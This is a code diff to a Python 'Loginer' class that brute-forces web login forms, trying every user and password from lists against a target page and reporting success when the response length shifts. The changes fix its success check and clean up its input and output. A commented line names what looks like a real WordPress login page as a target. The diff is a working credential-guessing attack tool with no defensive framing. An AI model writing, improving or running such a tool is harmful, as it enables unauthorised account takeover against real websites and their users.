@@ -96,10 +96,13 @@ class Loginer:
 
 		""""""
 		# url = "http://leafus.com.ua/wp-login.php"
-		# print(f"Connecting to: {url}......\n")
+		print()
+		print(f"Connecting to: {url}......\n")
 		for user in self.users:
+			user = user.replace('\n', '')
 			average = 0
 			for password in self.passwords:
+				password = password.replace('\n', '')
 				# Return login, password and other input.names + target url + method
 				r = requests.get(url)
 
@@ -109,7 +112,7 @@ class Loginer:
 					print("Can't fill form, skipping page")
 					return
 
-				print(f"trying {user}: {password}")
+				print(f"trying {user}: {password}", end='')
 				payload = dict(fillings[:-2][0])
 				post_url = fillings[-2:-1][0]
 				method = fillings[-1:][0]
@@ -124,8 +127,9 @@ class Loginer:
 						###############################
 						if not average:
 							average = len(p.text)
-						elif abs(average - len(p.text)) <= 50:
-							print("login successful!")
+						elif abs(average - len(p.text)) >= 50:
+							print(bcolors.CYAN + "   login successful!" + bcolors.RESET)
+						print()
 						###############################
 
 				elif method == "GET":
@@ -134,8 +138,8 @@ class Loginer:
 						###############################
 						if not average:
 							average = len(res.text)
-						elif abs(average - len(res.text)) <= 50:
-							print(bcolors.CYAN + "login successful!")
+						elif abs(average - len(res.text)) >= 50:
+							print(bcolors.CYAN + "login successful!" + bcolors.RESET)
 						###############################
 
 				else:
